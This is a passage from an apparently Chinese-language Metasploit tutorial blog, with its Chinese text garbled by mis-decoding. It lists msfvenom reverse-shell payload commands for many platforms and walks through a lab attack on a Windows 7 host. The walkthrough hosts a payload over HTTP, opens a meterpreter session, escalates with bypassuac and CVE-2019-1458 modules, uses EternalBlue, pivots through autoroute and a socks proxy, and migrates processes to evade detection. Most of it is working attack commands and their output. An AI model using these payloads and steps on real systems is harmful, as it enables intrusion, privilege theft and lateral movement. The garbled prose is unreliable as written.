<p>ç®€å•çš„è¯´å°±æ˜¯æ”¶é›†æ›´å¤šä¿¡æ¯æˆ–è¿›ä¸€æ­¥è®¿é—®è¢«åˆ©ç”¨çš„ç›®æ ‡ç³»ç»Ÿ</p>
<h3 id="Encoders-ç¼–ç å·¥å…·æ¨¡å—"><a href="#Encoders-ç¼–ç å·¥å…·æ¨¡å—" class="headerlink" title="Encoders (ç¼–ç å·¥å…·æ¨¡å—)"></a>Encoders (ç¼–ç å·¥å…·æ¨¡å—)</h3><p>è¯¥æ¨¡å—åœ¨æ¸—é€æµ‹è¯•ä¸­è´Ÿè´£å…æ€ï¼Œä»¥é˜²æ­¢è¢«æ€æ¯’è½¯ä»¶ã€é˜²ç«å¢™ã€IDSåŠç±»ä¼¼çš„å®‰å…¨è½¯ä»¶æ£€æµ‹å‡ºæ¥ã€‚</p>
<p>ç®€å•çš„è¯´å°±æ˜¯å°†æ”»å‡»è½½è·è¿›è¡Œç¼–ç ï¼Œæ¥ç»•è¿‡é˜²æŠ¤è½¯ä»¶æ‹¦æˆª</p>
<h1 id="Msfvenomç”Ÿæˆpayloadå‚æ•°è¯¦è§£"><a href="#Msfvenomç”Ÿæˆpayloadå‚æ•°è¯¦è§£" class="headerlink" title="Msfvenomç”Ÿæˆpayloadå‚æ•°è¯¦è§£"></a>Msfvenomç”Ÿæˆpayloadå‚æ•°è¯¦è§£</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">1.-p</span><br><span class="line"></span><br><span class="line">è¿™ä¸ªæ˜¯æŒ‡å®šä½ è¦åŠ è½½çš„ payload</span><br><span class="line"></span><br><span class="line">2.-l</span><br><span class="line"></span><br><span class="line">åˆ—å‡ºæ‰€æœ‰çš„ payload</span><br><span class="line"></span><br><span class="line">3.-n</span><br><span class="line"></span><br><span class="line">è®¾ç½® nopsled çš„å¤§å°ï¼Œå¸¸ç”¨ rop ç±»å‹çš„ payloadï¼Œå¯ä»¥ç»•è¿‡ç³»ç»Ÿ edp ä¿æŠ¤</span><br><span class="line"></span><br><span class="line">4.-f</span><br><span class="line"></span><br><span class="line">æŒ‡å®šä¸¤ç§æ ¼å¼è¾“å‡ºï¼Œå’Œ msfencode -t ç›¸åŒ</span><br><span class="line"></span><br><span class="line">ï¼ˆç¬¬ä¸€ç§ï¼šæ”¯æŒ aspx php asp exe dll elf jsp msi war vbs</span><br><span class="line">ç­‰ç­‰å¸¸ç”¨æ ¼å¼\...\...\...\...\...\.....ï¼‰</span><br><span class="line"></span><br><span class="line">ï¼ˆç¬¬äºŒç§ï¼šæ”¯æŒäº† bash c java python ruby psl py perl pl</span><br><span class="line">ç­‰ç­‰å¸¸ç”¨æ ¼å¼\...\...\...\...\...\...\...ï¼‰</span><br><span class="line"></span><br><span class="line">5.-e</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨ç¼–ç å™¨</span><br><span class="line"></span><br><span class="line">6.-a</span><br><span class="line"></span><br><span class="line">ç²¾ç¡®çš„ä½¿ç”¨ç¼–ç ï¼ˆç”Ÿæˆçš„ payload ç”¨äº 32 ä½æ“ä½œç³»ç»Ÿ é‚£ä¹ˆå°±æŒ‡å®š -a</span><br><span class="line">x86ï¼‰</span><br><span class="line"></span><br><span class="line">7.-s</span><br><span class="line"></span><br><span class="line">ç”Ÿæˆ payload çš„æ—¶å€™å¯ä»¥æŒ‡å®šæœ€å¤§å¤šå°‘</span><br><span class="line"></span><br><span class="line">8.-b</span><br><span class="line"></span><br><span class="line">å»é™¤ç©ºä»£ç æˆ–è€…é”™è¯¯ä»£ç å‡å°‘å¤šä½™çš„å­—ç¬¦åŒæ—¶å‡å°‘ä½“ç§¯ï¼ˆä¾‹å¦‚ï¼š-b</span><br><span class="line">\\xOO\\xffï¼‰</span><br><span class="line"></span><br><span class="line">9.-i</span><br><span class="line"></span><br><span class="line">æŒ‡å®šç¼–ç æ¬¡æ•°</span><br><span class="line"></span><br><span class="line">10.-c æ†ç»‘11. -o æŒ‡å®šè¾“å‡ºä½ç½®</span><br></pre></td></tr></table></figure>

<h2 id="å¸¸ç”¨è„šæœ¬çš„ç”Ÿæˆï¼š"><a href="#å¸¸ç”¨è„šæœ¬çš„ç”Ÿæˆï¼š" class="headerlink" title="å¸¸ç”¨è„šæœ¬çš„ç”Ÿæˆï¼š"></a>å¸¸ç”¨è„šæœ¬çš„ç”Ÿæˆï¼š</h2><p><strong>LHOSTåå¡«ä¸Šæ”»å‡»æœºIPï¼ŒLPORTåæ¥ä¸Šç›‘å¬çš„ç«¯å£</strong></p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h3><p><strong>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; root.elf</strong></p>
<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h3><p><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe</strong></p>
<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a><strong>Mac</strong></h3><p><strong>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f macho &gt; shell.macho</strong></p>
<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a><strong>PHP</strong></h3><p><strong>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php cat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</strong></p>
<h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a><strong>ASP</strong></h3><p><strong>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f asp &gt; shell.asp</strong></p>
<h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a><strong>JSP</strong></h3><p><strong>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp</strong></p>
<h3 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a><strong>WAR</strong></h3><p><strong>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war</strong></p>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a><strong>Python</strong></h3><p><strong>msfvenom -p python/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.py</strong></p>
<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a><strong>Bash</strong></h3><p><strong>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.sh</strong></p>
<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a><strong>Perl</strong></h3><p><strong>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw shell.pl</strong></p>
<h1 id="åˆ©ç”¨msfå®ç°åå¼¹shellä¸ææƒ"><a href="#åˆ©ç”¨msfå®ç°åå¼¹shellä¸ææƒ" class="headerlink" title="åˆ©ç”¨msfå®ç°åå¼¹shellä¸ææƒ"></a>åˆ©ç”¨msfå®ç°åå¼¹shellä¸ææƒ</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>æ”»å‡»æœºkali IPï¼š192.168.7.154</p>
<p>Win7é¶æœº IPï¼š192.168.7.131</p>
<h2 id="ç”Ÿæˆæœ¨é©¬"><a href="#ç”Ÿæˆæœ¨é©¬" class="headerlink" title="ç”Ÿæˆæœ¨é©¬"></a>ç”Ÿæˆæœ¨é©¬</h2><p><strong>Kaliç”Ÿæˆpayload</strong></p>
<p><strong>â”Œâ”€â”€(kaliã‰¿kali)-[~/Desktop]</strong></p>
<p><strong>â””â”€$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.7.154<br>LPORT=4444 -f exe -o payload.exe</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image3.png"></p>
<h2 id="Kaliæ‰“å¼€apacheæœåŠ¡"><a href="#Kaliæ‰“å¼€apacheæœåŠ¡" class="headerlink" title="Kaliæ‰“å¼€apacheæœåŠ¡"></a>Kaliæ‰“å¼€apacheæœåŠ¡</h2><p>åˆ‡æ¢å½“rootç”¨æˆ·</p>
<p><strong>sudo su -</strong></p>
<p>ä¸ºäº†ä½¿å¾—é¶æœºèƒ½å¤Ÿè®¿é—®æ”»å‡»æœºã€‚</p>
<p><strong>â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop]</strong></p>
<p><strong>â””â”€# mv payload.exe /var/www/html/</strong></p>
<p><strong>â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop]</strong></p>
<p><strong>â””â”€# systemctl start apache2</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image4.png"></p>
<h2 id="Kaliè®¾ç½®è®¾ç½®ç›‘å¬"><a href="#Kaliè®¾ç½®è®¾ç½®ç›‘å¬" class="headerlink" title="Kaliè®¾ç½®è®¾ç½®ç›‘å¬"></a>Kaliè®¾ç½®è®¾ç½®ç›‘å¬</h2><h3 id="â‘ æ‰“å¼€msfconsoleæ¨¡å—"><a href="#â‘ æ‰“å¼€msfconsoleæ¨¡å—" class="headerlink" title="â‘ æ‰“å¼€msfconsoleæ¨¡å—"></a>â‘ æ‰“å¼€msfconsoleæ¨¡å—</h3><p><strong>â”Œâ”€â”€(rootğŸ’€kali)-[/home/kali/Desktop]</strong></p>
<p><strong>â””â”€# msfconsole</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image5.png"></p>
<h3 id="â‘¡ä½¿ç”¨ç›‘å¬use"><a href="#â‘¡ä½¿ç”¨ç›‘å¬use" class="headerlink" title="â‘¡ä½¿ç”¨ç›‘å¬use"></a>â‘¡ä½¿ç”¨ç›‘å¬use</h3><p><strong>msf6 &gt; use exploit/multi/handler</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image6.png"></p>
<h3 id="â‘¢è®¾ç½®ç›‘å¬çš„payload"><a href="#â‘¢è®¾ç½®ç›‘å¬çš„payload" class="headerlink" title="â‘¢è®¾ç½®ç›‘å¬çš„payload"></a>â‘¢è®¾ç½®ç›‘å¬çš„payload</h3><p>è¿™é‡Œçš„payloadè½½è·è¦ä¸ç”Ÿæˆæœ¨é©¬çš„ä¸€è‡´å¦åˆ™å°†ä¼šå¤±è´¥</p>
<p><strong>msf6 exploit(multi/handler) &gt; set payload<br>windows/meterpreter/reverse_tcp</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image7.png"></p>
<h3 id="â‘£è®¾ç½®é€‰é¡¹options"><a href="#â‘£è®¾ç½®é€‰é¡¹options" class="headerlink" title="â‘£è®¾ç½®é€‰é¡¹options"></a>â‘£è®¾ç½®é€‰é¡¹options</h3><p><strong>msf6 exploit(multi/handler) &gt; set lhost 192.168.7.154</strong></p>
<p><strong>lhost =&gt; 192.168.7.154</strong></p>
<p><strong>msf6 exploit(multi/handler) &gt; set lport 4444</strong></p>
<p><strong>lport =&gt; 4444</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image8.png"></p>
<h3 id="â‘¤å¼€å§‹æ‰§è¡Œ"><a href="#â‘¤å¼€å§‹æ‰§è¡Œ" class="headerlink" title="â‘¤å¼€å§‹æ‰§è¡Œ"></a>â‘¤å¼€å§‹æ‰§è¡Œ</h3><p><strong>msf6 exploit(multi/handler) &gt; run</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image9.png"></p>
<h2 id="é¶æœºè¿›è¡Œè®¿é—®æ”»å‡»æœºçš„èµ„æº"><a href="#é¶æœºè¿›è¡Œè®¿é—®æ”»å‡»æœºçš„èµ„æº" class="headerlink" title="é¶æœºè¿›è¡Œè®¿é—®æ”»å‡»æœºçš„èµ„æº"></a>é¶æœºè¿›è¡Œè®¿é—®æ”»å‡»æœºçš„èµ„æº</h2><p><strong><a target="_blank" rel="noopener" href="http://192.168.7.154/payload.exe">http://192.168.7.154/payload.exe</a> ä¸‹è½½åå¹¶è¿›è¡Œè¿è¡Œ</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image10.png"></p>
<h2 id="Kaliåå¼¹shellæˆåŠŸ"><a href="#Kaliåå¼¹shellæˆåŠŸ" class="headerlink" title="Kaliåå¼¹shellæˆåŠŸ"></a>Kaliåå¼¹shellæˆåŠŸ</h2><p>å®¿ä¸»æœºè¿è¡Œpayload.exe å‡ºç°ä¸‹é¢ç±»ä¼¼å‘½ä»¤è¡¨ç¤ºåå¼¹æˆåŠŸ</p>
<p><strong>æ ‡å¿—ï¼š[*] Meterpreter session 1 opened (192.168.7.154:4444 -&gt;192.168.7.131:1038) at 2021-08-04 21:07:28 -0400</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image11.png"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><h3 id="â‘ getsystem"><a href="#â‘ getsystem" class="headerlink" title="â‘ getsystem"></a>â‘ getsystem</h3><p>é¦–å…ˆæ•²msfè‡ªå¸¦çš„getsystemè¯•ä¸‹è¿æ°”ï¼ŒæˆåŠŸå°±ä¸‡äº‹å¤§å‰ã€‚</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image12.png"></p>
<h3 id="â‘¡bypassuac"><a href="#â‘¡bypassuac" class="headerlink" title="â‘¡bypassuac"></a>â‘¡bypassuac</h3><p>å†…ç½®å¤šä¸ªpypassuacè„šæœ¬ï¼ŒåŸç†æœ‰æ‰€ä¸åŒï¼Œä½¿ç”¨æ–¹æ³•ç±»ä¼¼ï¼Œè¿è¡Œåè¿”å›ä¸€ä¸ªæ–°çš„ä¼šè¯ï¼Œéœ€è¦<strong>å†æ¬¡æ‰§è¡Œgetsystem</strong>è·å–ç³»ç»Ÿæƒé™ï¼Œå¦‚ï¼š</p>
<p><strong>use exploit/windows/local/bypassuac</strong></p>
<p><strong>use exploit/windows/local/bypassuac_injection</strong></p>
<p><strong>use windows/local/bypassuac_vbs</strong></p>
<p><strong>use windows/local/ask</strong></p>
<p>ä¸æ–­å°è¯•ä¸Šé¢çš„useç›´åˆ°èƒ½è·å¾—Systemä¸ºæ­¢</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image13.png"><br><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image14.png"></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image15.png"></p>
<h3 id="â‘¢å†…æ ¸ææƒ"><a href="#â‘¢å†…æ ¸ææƒ" class="headerlink" title="â‘¢å†…æ ¸ææƒ"></a>â‘¢å†…æ ¸ææƒ</h3><p><strong>ä½¿ç”¨å‘½ä»¤æ£€æµ‹å½“å‰ç³»ç»Ÿå­˜åœ¨çš„æ¼æ´</strong></p>
<p>use post/multi/recon/local_exploit_suggester</p>
<p><strong>è¿™é‡Œæä¸€å¥ï¼Œæœ‰äº›expæ˜¯é’ˆå¯¹ç”Ÿæˆçš„x86æˆ–æ˜¯x64ç‰ˆæœ¬çš„ï¼Œæ‰€ä»¥åœ¨ç”Ÿæˆçš„æ—¶å€™ä¹Ÿè¦æ ¹æ®ç›®æ ‡ä¸»æœºç”Ÿæˆä¸åŒ<br>ä½æ•°çš„exe</strong></p>
<p>root@kali:~# msfvenom -p windows/x64/meterpreter_reverse_tcp<br>lhost=192.168.7.154 lport=4455 -f exe -o payloadx64.exe</p>
<p><strong>#è¿™é‡Œé€‰æ‹©x64ç‰ˆæœ¬</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image16.png"><br><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image17.png"></p>
<p><strong>è¿™å°±æ˜¯å½“å‰å­˜åœ¨çš„ç³»ç»Ÿæ¼æ´ï¼Œå¯ä»¥ä¸€ä¸€å°è¯•è¿›è¡Œåˆ¤æ–­æ˜¯å¦æœ‰ææƒã€‚</strong></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image18.png"><br><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image19.png"></p>
<p>æœ€åé€šè¿‡ä¸æ–­å°è¯•å‘ç°win7ä¸Šç”¨å‘½ä»¤</p>
<p><strong>use exploit/windows/local/cve_2019_1458_wizardopium</strong></p>
<p>æˆåŠŸè¿›è¡Œææƒæ“ä½œã€‚</p>
<h1 id="å†…ç½‘æ‹¿system"><a href="#å†…ç½‘æ‹¿system" class="headerlink" title="å†…ç½‘æ‹¿system"></a>å†…ç½‘æ‹¿system</h1><ol>
<li><h2 id="å€ŸåŠ©MSFæ¢æµ‹å¯ææƒæ–¹æ³•"><a href="#å€ŸåŠ©MSFæ¢æµ‹å¯ææƒæ–¹æ³•" class="headerlink" title="å€ŸåŠ©MSFæ¢æµ‹å¯ææƒæ–¹æ³•"></a>å€ŸåŠ©MSFæ¢æµ‹å¯ææƒæ–¹æ³•</h2><p>use post/multi/recon/local_exploit_suggester</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image20.png"><br><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image21.png"><br><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image22.png"><br><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image23.png"></p>
</li>
</ol>
<h2 id="2-SMBæœåŠ¡"><a href="#2-SMBæœåŠ¡" class="headerlink" title="2)SMBæœåŠ¡"></a>2)SMBæœåŠ¡</h2><p><strong>å¦‚åˆ©ç”¨ï¼šMS-17010</strong></p>
<p><strong>æ”»å‡»æœº: 192.168.52.4</strong></p>
<p><strong>å—å®³åŠ: 192.168.52.3</strong></p>
<h3 id="â‘ æ¢é’ˆå½“å‰ç³»ç»Ÿæ˜¯å¦å¼€å¯SMBæœåŠ¡"><a href="#â‘ æ¢é’ˆå½“å‰ç³»ç»Ÿæ˜¯å¦å¼€å¯SMBæœåŠ¡" class="headerlink" title="â‘ æ¢é’ˆå½“å‰ç³»ç»Ÿæ˜¯å¦å¼€å¯SMBæœåŠ¡"></a>â‘ æ¢é’ˆå½“å‰ç³»ç»Ÿæ˜¯å¦å¼€å¯SMBæœåŠ¡</h3><p>use auxiliary/scanner/smb/smb_ms17_010</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image24.png"></p>
<h3 id="â‘¡è¿›è¡Œåˆ©ç”¨å¯¹åº”EXP"><a href="#â‘¡è¿›è¡Œåˆ©ç”¨å¯¹åº”EXP" class="headerlink" title="â‘¡è¿›è¡Œåˆ©ç”¨å¯¹åº”EXP"></a>â‘¡è¿›è¡Œåˆ©ç”¨å¯¹åº”EXP</h3><p>use exploit/windows/smb/ms17_010_eternalblue</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image25.png"></p>
<h3 id="â‘¢æ‹¿åˆ°systemæƒé™"><a href="#â‘¢æ‹¿åˆ°systemæƒé™" class="headerlink" title="â‘¢æ‹¿åˆ°systemæƒé™"></a>â‘¢æ‹¿åˆ°systemæƒé™</h3><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image26.png"></p>
<h1 id="åˆ©ç”¨MSFå¼€å¯sockeå¼€å¯å†…ç½‘æ¼«æ¸¸"><a href="#åˆ©ç”¨MSFå¼€å¯sockeå¼€å¯å†…ç½‘æ¼«æ¸¸" class="headerlink" title="åˆ©ç”¨MSFå¼€å¯sockeå¼€å¯å†…ç½‘æ¼«æ¸¸"></a>åˆ©ç”¨MSFå¼€å¯sockeå¼€å¯å†…ç½‘æ¼«æ¸¸</h1><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image27.png"></p>
<p><strong>å®éªŒç›®çš„ï¼šå®ç°kaliæœºèƒ½å¤Ÿå®ç°è®¿é—®Target 2çš„ç½‘æ®µIP: 192.168.22.0/24</strong></p>
<h2 id="â‘ æ·»åŠ è·¯ç”±"><a href="#â‘ æ·»åŠ è·¯ç”±" class="headerlink" title="â‘ æ·»åŠ è·¯ç”±"></a>â‘ æ·»åŠ è·¯ç”±</h2><p><strong>ä¸ºèŠ‚çœæ­¥éª¤ï¼Œæ­¤æ—¶Target 1ä»¥åŠåå¼¹åˆ°MSFä¸Š</strong></p>
<p>è·å–ç½‘ç»œæ¥å£ï¼šrun get_local_subnets</p>
<p>æŸ¥çœ‹è·¯ç”±åœ°å€ï¼šrun autoroute -p</p>
<p>æ·»åŠ è·¯ç”±åœ°å€ï¼šrun autoroute -s 192.168.22.0/24</p>
<p>run autoroute -s 192.168.22.0/24</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image28.png"></p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image29.png"></p>
<h2 id="â‘¡å¼€å¯æœ¬åœ°ä»£ç†ï¼š"><a href="#â‘¡å¼€å¯æœ¬åœ°ä»£ç†ï¼š" class="headerlink" title="â‘¡å¼€å¯æœ¬åœ°ä»£ç†ï¼š"></a>â‘¡å¼€å¯æœ¬åœ°ä»£ç†ï¼š</h2><p>use auxiliary/server/socks_proxy</p>
<p>set version 4a</p>
<p>set srvport 3333</p>
<p>run</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image30.png"></p>
<h2 id="â‘¢åˆ©ç”¨æœ¬åœ°ä»£ç†æ¥å£è®¿é—®æµ‹è¯•"><a href="#â‘¢åˆ©ç”¨æœ¬åœ°ä»£ç†æ¥å£è®¿é—®æµ‹è¯•" class="headerlink" title="â‘¢åˆ©ç”¨æœ¬åœ°ä»£ç†æ¥å£è®¿é—®æµ‹è¯•"></a>â‘¢åˆ©ç”¨æœ¬åœ°ä»£ç†æ¥å£è®¿é—®æµ‹è¯•</h2><h3 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux:"></a>Linux:</h3><p>é…ç½® proxychain.confæ–‡ä»¶ï¼Œåœ¨å…¶åæ·»åŠ socks4 192.168.1.129 3333<br>ä¸ä¸Šè¿°æœ¬åœ°ä»£ç†ç«¯å£ä¸€è‡´</p>
<p>æ–‡ä»¶åœ¨**/etc/proxychains.conf**</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image31.png"></p>
<p>ä¹‹åå°±å¯ä»¥åœ¨ç›¸å…³å‘½ä»¤å‰åŠ proxychains4è¿›è¡Œæ¢é’ˆå³å¯ï¼Œ</p>
<p>å¦‚proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80</p>
<p>-Pnï¼šä¸åšpingæ‰«æï¼Œæ‰«æä¸»æœºæ£€æµ‹å…¶æ˜¯å¦å—åˆ°æ•°æ®åŒ…è¿‡æ»¤è½¯ä»¶æˆ–é˜²ç«å¢™çš„ä¿æŠ¤ã€‚</p>
<p>-sTï¼šæ‰«æ TCP æ•°æ®åŒ…å·²å»ºç«‹çš„è¿æ¥ connect</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image32.png"></p>
<h3 id="æµè§ˆå™¨"><a href="#æµè§ˆå™¨" class="headerlink" title="æµè§ˆå™¨"></a>æµè§ˆå™¨</h3><p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image33.png"><br><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image34.png"></p>
<h1 id="MSFè¿ç§»è¿›ç¨‹"><a href="#MSFè¿ç§»è¿›ç¨‹" class="headerlink" title="MSFè¿ç§»è¿›ç¨‹"></a>MSFè¿ç§»è¿›ç¨‹</h1><h2 id="ç›®çš„"><a href="#ç›®çš„" class="headerlink" title="ç›®çš„"></a>ç›®çš„</h2><p>é€šè¿‡msfå¾—åˆ°çš„ä¼šè¯å®¹æ˜“è¢«å‘ç°ï¼Œå¯¼è‡´åæ¸—é€å¤±è´¥ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥æŠŠshellçš„è¿›ç¨‹è¿ç§»ç»‘å®šåˆ°ç›®æ ‡æœºæ­£å¸¸çš„è¿›ç¨‹ä¸­</p>
<h2 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h2><p>ps #æŸ¥çœ‹è¿›ç¨‹</p>
<p>migrate uid #è¿ç§»åˆ°64ä½å…·æœ‰systemæƒé™çš„uidç¼–å·å³å¯</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image35.png"></p>
<h1 id="å†…ç½‘æ¢æµ‹"><a href="#å†…ç½‘æ¢æµ‹" class="headerlink" title=" å†…ç½‘æ¢æµ‹"></a><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image36.png"> å†…ç½‘æ¢æµ‹</h1><h2 id="ä¸»æœºæ¢æµ‹"><a href="#ä¸»æœºæ¢æµ‹" class="headerlink" title="ä¸»æœºæ¢æµ‹"></a>ä¸»æœºæ¢æµ‹</h2><p>auxiliary/scanner/discovery/udp_sweep #åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</p>
<p>auxiliary/scanner/discovery/udp_probe #åŸºäºudpåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</p>
<p>auxiliary/scanner/netbios/nbname #åŸºäºnetbiosåè®®å‘ç°å†…ç½‘å­˜æ´»ä¸»æœº</p>
<h2 id="ç«¯å£æ¢æµ‹"><a href="#ç«¯å£æ¢æµ‹" class="headerlink" title="ç«¯å£æ¢æµ‹"></a>ç«¯å£æ¢æµ‹</h2><p>â‘ </p>
<p>auxiliary/scanner/portscan/tcp #åŸºäºtcpè¿›è¡Œç«¯å£æ‰«æ(é»˜è®¤æ‰«æ1-10000)</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image37.png"></p>
<p>â‘¡ä½¿ç”¨ proxychains ä»£ç†é“¾åˆ©ç”¨ nmap å¯¹å†…ç½‘ä¸»æœºè¿›è¡Œç«¯å£æ¢æµ‹</p>
<p><img src="https://mrfan6i.oss-cn-hangzhou.aliyuncs.com/img/image38.png"></p>
<h2 id="ä¸»æœºæœåŠ¡æ¢æµ‹"><a href="#ä¸»æœºæœåŠ¡æ¢æµ‹" class="headerlink" title="ä¸»æœºæœåŠ¡æ¢æµ‹"></a>ä¸»æœºæœåŠ¡æ¢æµ‹</h2><p>auxiliary/scanner/ftp/ftp_version #å‘ç°å†…ç½‘ftpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤21ç«¯å£</p>
<p>auxiliary/scanner/ssh/ssh_version #å‘ç°å†…ç½‘sshæœåŠ¡ï¼ŒåŸºäºé»˜è®¤22ç«¯å£</p>
<p>auxiliary/scanner/telnet/telnet_version<br>#å‘ç°å†…ç½‘telnetæœåŠ¡ï¼ŒåŸºäºé»˜è®¤23ç«¯å£</p>
<p>auxiliary/scanner/dns/dns_amp #å‘ç°dnsæœåŠ¡ï¼ŒåŸºäºé»˜è®¤53ç«¯å£</p>
<p>auxiliary/scanner/http/http_version #å‘ç°å†…ç½‘httpæœåŠ¡ï¼ŒåŸºäºé»˜è®¤80ç«¯å£</p>
<p>auxiliary/scanner/http/title #æ¢æµ‹å†…ç½‘httpæœåŠ¡çš„æ ‡é¢˜</p>
<p>auxiliary/scanner/smb/smb_version #å‘ç°å†…ç½‘smbæœåŠ¡ï¼ŒåŸºäºé»˜è®¤çš„445ç«¯å£</p>
<p>auxiliary/scanner/mssql/mssql_schemadump<br>#å‘ç°å†…ç½‘SQLServeræœåŠ¡,åŸºäºé»˜è®¤çš„1433ç«¯å£</p>
<p>auxiliary/scanner/oracle/oracle_hashdump<br>#å‘ç°å†…ç½‘oracleæœåŠ¡,åŸºäºé»˜è®¤çš„1521ç«¯å£</p>
<p>auxiliary/scanner/mysql/mysql_version<br>#å‘ç°å†…ç½‘mysqlæœåŠ¡ï¼ŒåŸºäºé»˜è®¤3306ç«¯å£</p>
